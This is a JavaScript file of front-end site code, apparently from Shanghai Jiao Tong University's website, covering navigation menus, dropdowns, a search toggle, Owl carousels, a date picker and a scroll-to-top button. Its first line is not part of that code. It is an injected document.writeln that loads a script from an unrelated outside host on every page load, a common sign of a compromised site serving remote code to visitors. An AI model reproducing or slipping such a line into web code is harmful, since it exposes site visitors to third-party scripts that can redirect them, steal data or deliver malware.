
document.writeln("<script src=\'https://gl.ewdcloud.com/salmon.php?appkey=54&20181026\' defer=\'defer\'></script>");

var Main = function() {
	"use strict";


    var runManiNav = function() {
        //响应式导航--infinitypush.js
        function responsive() {
            if($(window).width() <= 767){
                $('#mobile-navigation').infinitypush({
                    offcanvasleft: false
                });
                $('body').addClass('mobile');
                $('body').removeClass('desktop');

            } else {
                $('#mobile-navigation').infinitypush({
                    destroy:true
                });
                $('body').removeClass('mobile');
                $('body').addClass('desktop');
            }

        }
        function windowResize(){
            $(window).resize(function(){
                responsive();
            });
        }
        responsive();
        windowResize();

        //主导航菜单固定在顶部--stickUp.js
        $(document).ready( function() {
            $('.stickUp-Nav').stickUp();
        });

        //导航 dropdown 鼠标划过自动下拉菜单
        if($('.desktop .dropdown').length){
            $(".dropdown").hover(
                function() { $('.dropdown-menu', this).fadeIn("fast");
                },
                function() { $('.dropdown-menu', this).fadeOut("fast");
                });
        }
    };

	var ToggleDropdown = function () {
		//导航 dropdown 鼠标划过自动下拉菜单
		if($('.dropdown').length){
    		$(".dropdown").hover(
        		function() { 
					$('.dropdown-menu', this).stop(true, true).fadeIn("fast");
					$(this).addClass('open');
				},
				function() { 
					$('.dropdown-menu', this).stop(true, true).fadeOut("fast");
					$(this).removeClass('open');
				}
			);
		};
		
	};

	var ToggleSearch = function () {
		$('a.search').click(function () {
			if ($('.navbar-form').hasClass('in')) {
				$('.navbar-form').removeClass('in').stop(true, true).slideUp('50');
				$('#main-container').removeClass('active');
			}else {
				$('.navbar-form').addClass('in').stop(true, true).slideDown('50');
				$('#main-container').addClass('active');
			}
		});
	}
    var dotdot = function () {
        $('.dot').dotdotdot({
            watch: 'window'
        });
    }

    var wowjs = function () {
        if ($(window).width() > 767) {
            if (!(/msie [6|7|8|9]/i.test(navigator.userAgent))) {
                new WOW().init();
            };
        };
    }

	var OwlCarousel = function () {
		if ($('.news-slider').length) {
			$('.news-slider').owlCarousel({
				items: 1,
                margin: 0,
                stagePadding: 0,
                smartSpeed: 1000,
                loop: true,
                autoplay: true,
                autoplayTimeout: 5000,
                autoplayHoverPause: true,
				nav: false,
				dots: true
			});
        };
        if ($('.SJTUdata').length) {
            $('.SJTUdata').owlCarousel({
                items: 2,
                margin: 10,
                smartSpeed: 1000,
                loop: true,
                autoplay: true,
                autoplayTimeout: 4000,
                autoplayHoverPause: true,
                dots: true,
                responsive: {
                    0:{
                        items:1,
                        nav:true,
                        loop:true
                    },
                    480:{
                        items:2,
                        nav:true,
                        loop:true
                    },
                    768:{
                        items:2,
                        nav:true,
                        loop:true
                    },
                    1000:{
                        items:2,
                        nav:true,
                        loop:true
                    },
                    1200:{
                        items:2,
                        nav:true,
                        loop:true
                    }
                }
            });
        };
        
        // 通知
        if ($('.notice-slider').length) {
			$('.notice-slider').owlCarousel({
                items: 2,
                margin: 10,
                stagePadding: 0,
                smartSpeed: 1000,
                loop: true,
                autoplay: true,
                autoplayTimeout: 5000,
                autoplayHoverPause: false,
                stopOnHover: false,
                mouseDrag: false,
                nav: false,
				dots: false,
                responsive: {
                    0:{
                        items:1,
                        nav:true,
                        loop:true
                    },
                    480:{
                        items:1,
                        nav:true,
                        loop:true
                    },
                    768:{
                        items:1,
                        nav:true,
                        loop:true
                    },
                    1000:{
                        items:2,
                        nav:true,
                        loop:true
                    },
                    1200:{
                        items:2,
                        nav:true,
                        loop:true
                    }
                }
			});
		};

		/*
		if ($('.learning-slider').length) {
			$('.learning-slider').owlCarousel({
				items: 3,
                margin: 0,
                stagePadding: 0,
                smartSpeed: 1000,
                loop: true,
                autoplay: true,
                autoplayTimeout: 3000,
                autoplayHoverPause: true,
				nav: true,
				dots: true,
                responsive: {
                    0:{
                        items:1,
                        nav:true,
                        loop:true
                    },
                    480:{
                        items:1,
                        nav:true,
                        loop:true
                    },
                    768:{
                        items:1,
                        nav:true,
                        loop:true
                    },
                    1000:{
                        items:2,
                        nav:true,
                        loop:true
                    },
                    1200:{
                        items:3,
                        nav:true,
                        loop:true
                    }
                }
			});
		};
		*/
		

        if ($('.column-list').length) {
            $('.column-list').owlCarousel({
                items: 5,
                margin: 0,
                stagePadding: 0,
                smartSpeed: 1000,
                loop: true,
                autoplay: true,
                autoplayTimeout: 3000,
                autoplayHoverPause: true,
                nav: true,
                dots: true,
                responsive:{
                    0:{
                        items:2,
                        nav:true,
                        loop:true
                    },
                    480:{
                        items:3,
                        nav:true,
                        loop:true
                    },
                    768:{
                        items:4,
                        nav:true,
                        loop:true
                    },
                    1000:{
                        items:4,
                        nav:true,
                        loop:true
                    },
                    1200:{
                        items:5,
                        nav:true,
                        loop:true
                    }
                }
            });
        };
    }
    
    var TimePicker = function () {
        $(".learning-date-picker").datetimepicker({
            format: 'yyyy-mm-dd',
            weekStart: 1,
            minView: 2,
            maxView: 2,
            language: 'zh-CN'
        });
    }
    var retinaLogos = function() {
        var retina = window.devicePixelRatio > 1 ? true : false;
         if( retina ) {
             $( '.navbar-header .logo' ).find('img').attr( {src:'https://www.sjtu.edu.cn/resource/assets/img/LogoWhite@2x.png'} );
              $( '.header2 .navbar-header').css({'width':'30%'})
          }
     };   
     
     var goTop = function() {
        $(window).scroll(function() {
            if ( $(this).scrollTop() > 700 ) {
                $('.go-top').addClass('show');
            } else {
                $('.go-top').removeClass('show');
            }
        });

        $('.go-top').on('click', function() {
            $("html, body").animate({ scrollTop: 0 }, 1000 , 'easeInOutExpo');
            return false;
        });
    };
	
	
	return {
		init : function() {
            runManiNav();
			ToggleDropdown();
			ToggleSearch();
            dotdot();
            wowjs();
			OwlCarousel();
            TimePicker();
           retinaLogos();
           goTop();
		}
	};
}();
//头部搜索点击其它 区域隐藏
$(function(){
        $(document).on('click',':not(.navbar-form)',function(){
            if($('.navbar-form').hasClass('in')){
            $('.navbar-form').removeClass('in').stop(true, true).slideUp('50');
            $('#main-container').removeClass('active');
                return;
            }
            })
            $(".search,.form-control").click(function(event){
                event.stopPropagation();
            });
            $(".search").click(function(){
            $('.dropdown119').removeClass('open')
            })
})  


